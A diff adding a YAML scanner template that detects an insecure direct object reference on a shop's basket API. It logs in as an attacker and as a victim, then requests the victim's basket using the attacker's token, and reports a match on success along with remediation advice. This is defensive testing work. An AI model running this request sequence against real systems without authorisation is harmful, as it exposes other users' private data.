@@ -1,0 +1,59 @@
+id: basket-idor
+info:
+  name: Basket IDOR Vulnerability
+  severity: high
+  description: Detects insecure direct object reference on basket endpoints
+  tags:
+    - idor
+    - access-control
+
+variables:
+  attacker_email: "{{ATTACKER_EMAIL}}"
+  attacker_password: "{{ATTACKER_PASSWORD}}"
+  victim_email: "{{VICTIM_EMAIL}}"
+  victim_password: "{{VICTIM_PASSWORD}}"
+
+requests:
+  - name: Attacker login
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": "{{attacker_email}}", "password": "{{attacker_password}}"}'
+    extractors:
+      - type: json
+        name: attacker_token
+        selector: "$.authentication.token"
+      - type: json
+        name: attacker_basket_id
+        selector: "$.bid"
+
+  - name: Victim login
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": "{{victim_email}}", "password": "{{victim_password}}"}'
+    extractors:
+      - type: json
+        name: victim_basket_id
+        selector: "$.bid"
+      - type: json
+        name: victim_token
+        selector: "$.authentication.token"
+
+  - name: Attacker tries to access victim basket
+    method: GET
+    path: /api/Basket/{{victim_basket_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      - type: status
+        values: [200]
+      - type: json
+        selector: "$.data.id"
+        condition: exists
+    on_match:
+      vulnerability: INSECURE_DIRECT_OBJECT_REFERENCE
+      message: Attacker can access victims basket
+      remediation: Verify that users can only access their own baskets
